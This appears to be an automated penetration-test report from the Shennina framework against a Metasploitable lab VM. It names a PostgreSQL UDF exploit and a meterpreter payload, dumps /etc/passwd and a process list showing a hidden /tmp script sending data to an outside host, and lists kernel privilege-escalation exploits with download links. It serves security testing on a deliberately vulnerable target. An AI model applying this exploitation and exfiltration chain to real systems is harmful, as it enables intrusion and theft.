
# Shennina Exploitation Report

## Target: `target-1.local`

#### The target has been compromised using the following:


## Exploit: `exploit/linux/postgres/postgres_payload`

## Exploit Details

### Name

```
PostgreSQL for Linux Payload Execution
```

### Description

```
On some default Linux installations of PostgreSQL, the postgres service account may write to the /tmp directory, and may source UDF Shared Libraries from there as well, allowing execution of arbitrary code. This module compiles a Linux shared object file, uploads it to the target host via the UPDATE pg_largeobject method of binary injection, and creates a UDF (user defined function) from that shared object. Because the payload is run as the shared object's constructor, it does not need to conform to specific Postgres API versions.
```

### References

```
CVE-2007-3280
http://www.leidecker.info/pgshell/Having_Fun_With_PostgreSQL.txt
```

## Shell Type: `meterpreter`

## Payload: `payload/linux/x86/meterpreter/bind_ipv6_tcp`



---

# Data Obtained From Target via Exfiltration Server
### files_etc_passwd

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
dhcp:x:101:102::/nonexistent:/bin/false
syslog:x:102:103::/home/syslog:/bin/false
klog:x:103:104::/home/klog:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
bind:x:105:113::/var/cache/bind:/bin/false
postfix:x:106:115::/var/spool/postfix:/bin/false
ftp:x:107:65534::/home/ftp:/bin/false
postgres:x:108:117:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
mysql:x:109:118:MySQL Server,,,:/var/lib/mysql:/bin/false
tomcat55:x:110:65534::/usr/share/tomcat5.5:/bin/false
distccd:x:111:65534::/:/bin/false
user:x:1001:1001:just a user,111,,:/home/user:/bin/bash
service:x:1002:1002:,,,:/home/service:/bin/bash
telnetd:x:112:120::/nonexistent:/bin/false
proftpd:x:113:65534::/var/run/proftpd:/bin/false
statd:x:114:65534::/var/lib/nfs:/bin/false
snmp:x:115:65534::/var/lib/snmp:/bin/false

```

### files_etc_issue

```
                _                  _       _ _        _     _      ____  
 _ __ ___   ___| |_ __ _ ___ _ __ | | ___ (_) |_ __ _| |__ | | ___|___ \ 
| '_ ` _ \ / _ \ __/ _` / __| '_ \| |/ _ \| | __/ _` | '_ \| |/ _ \ __) |
| | | | | |  __/ || (_| \__ \ |_) | | (_) | | || (_| | |_) | |  __// __/ 
|_| |_| |_|\___|\__\__,_|___/ .__/|_|\___/|_|\__\__,_|_.__/|_|\___|_____|
                            |_|                                          


Warning: Never expose this VM to an untrusted network!

Contact: msfdev[at]metasploit.com

Login with msfadmin/msfadmin to get started



```

### ifconfig

```
eth0      Link encap:Ethernet  HWaddr 02:42:ac:11:00:03  
          inet addr:172.17.0.3  Bcast:172.17.255.255  Mask:255.255.0.0
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:5975 errors:0 dropped:0 overruns:0 frame:0
          TX packets:5623 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:3356541 (3.2 MB)  TX bytes:459187 (448.4 KB)

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:180 errors:0 dropped:0 overruns:0 frame:0
          TX packets:180 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:89945 (87.8 KB)  TX bytes:89945 (87.8 KB)


```

### uname

```
Linux d55b159897c5 5.0.0-31-generic #33~18.04.1-Ubuntu SMP Tue Oct 1 10:20:39 UTC 2019 x86_64 GNU/Linux

```

### id_command

```
uid=108(postgres) gid=117(postgres) groups=114(ssl-cert),117(postgres)

```

### user

```
postgres

```

### ps_aux

```
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.0  0.0   2784  2212 pts/0    Ss   06:34   0:00 bash -c /bin/services.sh; bash
daemon      70  0.0  0.0   2044  1136 ?        Ss   06:34   0:00 /usr/sbin/atd
root       101  0.0  0.0   2164  1760 ?        Ss   06:34   0:00 /usr/sbin/cron
daemon     124  0.0  0.0   2376  1248 ?        SNs  06:34   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon     125  0.0  0.0   2376   116 ?        SN   06:34   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root       178  0.0  0.0   2828  2324 pts/0    S    06:34   0:00 /bin/sh /usr/bin/mysqld_safe
mysql      220  0.0  0.1 135908 20684 pts/0    Sl   06:34   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=mysql --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking --port=3306 --socket=/var/run/mysqld/mysqld.sock
root       221  0.0  0.0   1760  1184 pts/0    S    06:34   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
daemon     232  0.0  0.0   2376   116 ?        SN   06:34   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon     409  0.0  0.0   5996  1288 ?        Ss   06:34   0:00 /sbin/portmap
daemon     413  0.0  0.0   2376   116 ?        SN   06:34   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root       496  0.0  0.0   5472  3064 ?        Ss   06:34   0:00 /usr/lib/postfix/master
postfix    502  0.0  0.0   5480  2988 ?        S    06:34   0:00 pickup -l -t fifo -u -c
postfix    503  0.0  0.0   5520  3124 ?        S    06:34   0:00 qmgr -l -t fifo -u
postgres   540  0.0  0.0  41400  9212 ?        S    06:34   0:00 /usr/lib/postgresql/8.3/bin/postgres -D /var/lib/postgresql/8.3/main -c config_file=/etc/postgresql/8.3/main/postgresql.conf
daemon     541  0.0  0.0   2376   116 ?        SN   06:34   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
postgres   543  0.0  0.0  41400  3868 ?        Ss   06:34   0:00 postgres: writer process                                                                                                    
postgres   544  0.0  0.0  41400  2584 ?        Ss   06:34   0:00 postgres: wal writer process                                                                                                
postgres   545  0.0  0.0  41400  3956 ?        Ss   06:34   0:00 postgres: autovacuum launcher process                                                                                       
postgres   546  0.0  0.0  12720  3424 ?        Ss   06:34   0:00 postgres: stats collector process                                                                                           
daemon     549  0.0  0.0   2376   116 ?        SN   06:34   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
daemon     556  0.0  0.0   2376   116 ?        SN   06:34   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
proftpd    594  0.0  0.0  10008  2748 ?        Ss   06:34   0:00 proftpd: (accepting connections)
root       655  0.0  0.0   5448  2608 ?        Ss   06:34   0:00 /usr/sbin/nmbd -D
root       657  0.0  0.0   7784  3620 ?        Ss   06:34   0:00 /usr/sbin/smbd -D
root       679  0.0  0.0   7784   560 ?        S    06:34   0:00 /usr/sbin/smbd -D
daemon     680  0.0  0.0   2376   116 ?        SN   06:34   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
snmp       682  0.0  0.0   8676  5928 ?        S    06:34   0:00 /usr/sbin/snmpd -Lsd -Lf /dev/null -u snmp -I -smux -p /var/run/snmpd.pid 127.0.0.1
root       714  0.0  0.0   5372  3168 ?        Ss   06:34   0:00 /usr/sbin/sshd
syslog     764  0.0  0.0   6096  5652 ?        Ss   06:34   0:00 /sbin/syslogd -u syslog
root       806  0.0  0.0   2112   124 ?        Ss   06:34   0:00 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
root       807  0.0  0.0   2112  1212 ?        S    06:34   0:00 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
tomcat55   808  0.9  0.5 374536 92188 ?        Sl   06:34   0:19 /usr/bin/jsvc -user tomcat55 -cp /usr/share/java/commons-daemon.jar:/usr/share/tomcat5.5/bin/bootstrap.jar -outfile SYSLOG -errfile SYSLOG -pidfile /var/run/tomcat5.5.pid -Djava.awt.headless=true -Xmx128M -Djava.endorsed.dirs=/usr/share/tomcat5.5/common/endorsed -Dcatalina.base=/var/lib/tomcat5.5 -Dcatalina.home=/usr/share/tomcat5.5 -Djava.io.tmpdir=/var/lib/tomcat5.5/temp -Djava.security.manager -Djava.security.policy=/var/lib/tomcat5.5/conf/catalina.policy org.apache.catalina.startup.Bootstrap
daemon     892  0.0  0.0   2376   116 ?        SN   06:34   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root       921  0.0  0.1  74600 30440 pts/0    Sl   06:34   0:00 /usr/bin/rmiregistry
root       928  0.0  0.0   2908  2484 pts/0    S+   06:34   0:00 bash
root       947  0.0  0.0  13988 13240 pts/0    S    06:34   0:01 Xtightvnc :0 -desktop X -auth /root/.Xauthority -geometry 1024x768 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport 5900 -fp /usr/X11R6/lib/X11/fonts/Type1/,/usr/X11R6/lib/X11/fonts/Speedo/,/usr/X11R6/lib/X11/fonts/misc/,/usr/X11R6/lib/X11/fonts/75dpi/,/usr/X11R6/lib/X11/fonts/100dpi/,/usr/share/fonts/X11/misc/,/usr/share/fonts/X11/Type1/,/usr/share/fonts/X11/75dpi/,/usr/share/fonts/X11/100dpi/ -co /etc/X11/rgb
root       948  0.0  0.0   8600  3816 pts/0    S    06:34   0:00 /usr/bin/unrealircd
root       951  0.0  0.0   2484  1792 ?        Ss   06:34   0:00 /usr/sbin/xinetd -pidfile /var/run/xinetd.pid -stayalive -inetd_compat
daemon     954  0.0  0.0   2376   116 ?        SN   06:34   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root       958  0.0  0.0   2784  2216 pts/0    S    06:34   0:00 /bin/sh /root/.vnc/xstartup
root       961  0.0  0.0   5996  4320 pts/0    S    06:34   0:00 xterm -geometry 80x24+10+10 -ls -title X Desktop
root       963  0.0  0.0   9048  7484 pts/0    S    06:34   0:01 fluxbox
root       996  0.0  0.0   2904  2436 pts/1    Ss+  06:34   0:00 -bash
daemon    1010  0.0  0.0   2376   116 ?        SN   06:34   0:00 distccd --daemon --user daemon --allow 0.0.0.0/0
root      1132  0.0  0.0   2796  2228 ?        SNs  06:44   0:00 sh
root      1143  0.0  0.0   1144   788 ?        SN   06:44   0:00 /tmp/gtqQL
postfix   1244  0.0  0.0   5848  4536 ?        S    07:05   0:00 tlsmgr -l -t unix -u -c
postgres  1616  0.0  0.0  43404  2652 ?        S    07:08   0:00 postgres: postgres template1 172.17.0.1(37517) CREATE FUNCTION                                                              
postgres  1631  0.0  0.0   3300  2468 ?        S    07:09   0:00 sh /tmp/.2ba58f31-7ccb-4a92-aaef-1664bbd243b9.sh 192.168.213.1:8040 2ba58f31-7ccb-4a92-aaef-1664bbd243b9
postgres  1632  0.0  0.0   3364  1832 ?        S    07:09   0:00 sh /tmp/.2ba58f31-7ccb-4a92-aaef-1664bbd243b9.sh 192.168.213.1:8040 2ba58f31-7ccb-4a92-aaef-1664bbd243b9
postgres  1674  0.0  0.0   3348   500 ?        S    07:09   0:00 sh /tmp/.2ba58f31-7ccb-4a92-aaef-1664bbd243b9.sh 192.168.213.1:8040 2ba58f31-7ccb-4a92-aaef-1664bbd243b9
postgres  1675  0.0  0.0   2424  1564 ?        R    07:09   0:00 ps aux
postgres  1676  0.0  0.0   3348  1832 ?        S    07:09   0:00 sh /tmp/.2ba58f31-7ccb-4a92-aaef-1664bbd243b9.sh 192.168.213.1:8040 2ba58f31-7ccb-4a92-aaef-1664bbd243b9
postgres  1677  0.0  0.0   1768   280 ?        S    07:09   0:00 xxd -ps /dev/stdin
postgres  1678  0.0  0.0   1796   304 ?        S    07:09   0:00 tr -d ?

```

### suggested_exploits

```

Available information:

Kernel version: 5.0.0
Architecture: x86_64
Distribution: ubuntu
Distribution version: N/A
Additional checks (CONFIG_*, sysctl entries, custom Bash commands): N/A
Package listing: N/A

Searching among:

72 kernel space exploits
0 user space exploits

Possible Exploits:

[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: less probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},debian=9{kernel:4.9.0-*},debian=10{kernel:4.19.0-*},fedora=30{kernel:5.0.9-*}
   Download URL: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c
   Comments: Requires an active PolKit agent.


```

